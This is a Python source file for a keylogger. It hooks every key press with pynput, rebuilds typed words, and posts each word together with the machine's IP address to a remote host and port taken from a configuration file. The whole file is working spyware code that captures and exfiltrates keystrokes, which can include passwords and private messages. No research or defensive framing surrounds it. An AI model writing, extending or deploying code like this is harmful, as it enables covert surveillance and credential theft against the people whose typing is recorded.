from pynput.keyboard import Key, Listener
import socket
from requests import post
from user_details import UserDetails
from configparser import SafeConfigParser

currentString = ''


def append_string(character):
    global currentString
    currentString += character


def delete_last_character():
    global currentString
    new_string = ''
    for i in range(0, len(currentString) - 1):
        new_string += currentString[i]
    currentString = new_string


def get_ip_address():
    return socket.gethostbyname(socket.gethostname())


def prepare_body(ip_address, message):
    return {'ipAddress': ip_address, 'message': message}


def clear_string():
    global currentString
    currentString = ''


def get_config_parser():
    parser = SafeConfigParser()
    parser.read('application.ini')
    return parser


def get_destination_url():
    parser = get_config_parser()
    host = parser.get('destination', 'host')
    port = parser.get('destination', 'port')
    return host, port


def post_message(message: UserDetails):
    host, port = get_destination_url()
    endpoint = 'user-details'
    post(url="http://{}:{}/{}".format(host, port, endpoint), json=message.to_json())


def send_message(message):
    if message == '' or message is None: return
    ip = get_ip_address()
    user_details = UserDetails(ip, message)
    print('Sent {}'.format(user_details.to_json()))
    post_message(user_details)


def on_press(key):
    global currentString
    if is_whitespace(key):
        send_message(currentString)
        clear_string()
    elif key is Key.backspace:
        delete_last_character()
    else:
        append_string(str(key)[1])


def is_whitespace(key):
    return key in [Key.enter, Key.space, Key.tab]


with Listener(on_press=on_press) as listener:
    listener.join()
